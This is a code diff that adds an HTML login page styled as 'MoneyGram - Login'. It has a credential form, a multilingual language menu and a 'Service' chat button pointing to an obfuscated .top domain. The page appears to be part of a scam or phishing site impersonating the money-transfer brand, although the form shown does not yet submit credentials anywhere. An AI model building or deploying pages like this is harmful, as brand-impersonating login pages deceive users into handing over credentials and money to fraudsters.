@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>MoneyGram - Login</title>
+  <link rel="stylesheet" href="assets/css/style.css" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-sRIl4kxILFvY47J16cr9ZwB07vP4J8+LH7qKQnuqkuIAvNWLzeN8tE5YBujZqJLB" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css" integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body>
+  <div class="auth-container">
+    <!-- Top Right Controls -->
+    <div class="top-bar">
+      <a href="https://pwtjhjrso.ahpbfevcbewnsezw.top/index?key=0ef3d6417da71d3b500ec6e5536043c3" target="_blank">
+        <button class="service-btn">💬 Service</button></a>
+      <div class="dropdown lang-select">
+        <button class="btn btn-light dropdown-toggle lang-btn" type="button" id="languageDropdown" data-bs-toggle="dropdown" aria-expanded="false">
+          <img src="https://flagcdn.com/us.svg" alt="English" class="flag" /> English
+        </button>
+        <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="languageDropdown">
+          <li><a class="dropdown-item lang-option" data-lang="en" data-flag="us.svg"><img src="https://flagcdn.com/us.svg" class="flag" alt="English">English</a></li>
+          <li><a class="dropdown-item lang-option" data-lang="vi" data-flag="vn.svg"><img src="https://flagcdn.com/vn.svg" class="flag" alt="Vietnamese">Vietnamese</a></li>
+          <li><a class="dropdown-item lang-option" data-lang="th" data-flag="th.svg"><img src="https://flagcdn.com/th.svg" class="flag" alt="Thai">Thai</a></li>
+          <li><a class="dropdown-item lang-option" data-lang="zh" data-flag="cn.svg"><img src="https://flagcdn.com/cn.svg" class="flag" alt="Chinese">Chinese</a></li>
+          <li><a class="dropdown-item lang-option" data-lang="ja" data-flag="jp.svg"><img src="https://flagcdn.com/jp.svg" class="flag" alt="Japanese">Japanese</a></li>
+          <li><a class="dropdown-item lang-option" data-lang="ko" data-flag="kr.svg"><img src="https://flagcdn.com/kr.svg" class="flag" alt="Korean">Korean</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <!-- Login Box -->
+    <div class="auth-box">
+
+        <div class="logo">
+        <img src="assets/images/logo.png" alt="MoneyGram Logo" />
+      </div>
+      <h3 class="brand">MONEY GRAM</h3>
+
+      <form>
+        <div class="form-group">
+          <input type="text" placeholder="Username/Email" required />
+        </div>
+        <div class="form-group password-field">
+          <input type="password" placeholder="Password" required />
+          <span class="eye-icon"><i class="fa-regular fa-eye"></i></span>
+        </div>
+        <button type="submit" class="login-btn">Login</button>
+
+        <div class="bottom-links mb-4">
+          <a href="#">Forgot password</a>
+          <a href="register.html">Register</a>
+        </div>
+      </form>
+
+    
+    </div>
+  </div>
+</body>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js" integrity="sha384-FKyoEForCGlyvwx9Hj09JcYn3nv7wiPVlz7YYwJrWVcXK/BmnVDxM+D2scQbITxI" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/js/all.min.js" integrity="sha512-6BTOlkauINO65nLhXhthZMtepgJSghyimIalb+crKRPhvhmsCdnIuGcVbR5/aQY2A+260iC1OPy1oCdB6pSSwQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+</html>
+<script>
+    const langOptions = document.querySelectorAll('.lang-option');
+    const langBtn = document.querySelector('.lang-btn');
+
+    langOptions.forEach(option => {
+      option.addEventListener('click', () => {
+        const lang = option.dataset.lang;
+        const flag = option.dataset.flag;
+        const label = option.textContent.trim();
+
+        // Update button display
+        langBtn.innerHTML = `<img src="https://flagcdn.com/${flag}" class="flag" alt="${label}" /> ${label}`;
+
+        // 🔤 Example translation logic placeholder
+        // You can integrate a translation API or localized JSON file here
+        console.log("Selected language:", lang);
+      });
+    });
+  </script>
